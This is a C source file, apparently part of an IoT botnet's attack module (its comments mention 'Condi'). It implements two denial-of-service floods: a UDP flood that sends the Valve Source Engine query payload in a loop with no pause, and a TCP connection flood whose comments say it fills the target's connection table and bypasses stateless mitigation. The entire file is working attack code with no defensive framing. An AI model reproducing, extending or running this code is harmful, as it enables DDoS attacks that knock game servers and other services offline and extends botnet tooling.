#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>

#include "attack.h"

// VSE Payload: fixed 4 bytes 0xFF, then "TSource Engine Query"
// \xff\xff\xff\xffTSource Engine Query\x00
static const char VSE_PAYLOAD[] = "\xff\xff\xff\xffTSource Engine Query\x00";

void attack_udp_vse(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = ip;

    time_t end_time = time(NULL) + duration;
    char packet[sizeof(VSE_PAYLOAD)];
    memcpy(packet, VSE_PAYLOAD, sizeof(VSE_PAYLOAD));

    while (time(NULL) < end_time) {
        sendto(sock, packet, sizeof(packet)-1, 0, (struct sockaddr *)&dest, sizeof(dest));
        // High speed flood, no sleep
    }

    close(sock);
}

void attack_socket(uint32_t ip, uint16_t port, uint32_t duration) {
    // Socket flood bypasses stateless mitigation by completing handshakes
    // We launch multiple forks or threads normally, but for single-threaded IoT simple loop:
    
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = ip;

    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        // Non-blocking connect
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr *)&dest, sizeof(dest));
        
        // We don't care if it succeeds or fails, checking it consumes resources too.
        // But Condi typically waits briefly or sends data if connected.
        // Currently just connect & close to fill connection table.
        // For better effect: usleep(1000); 
        
        close(sock);
    }
}
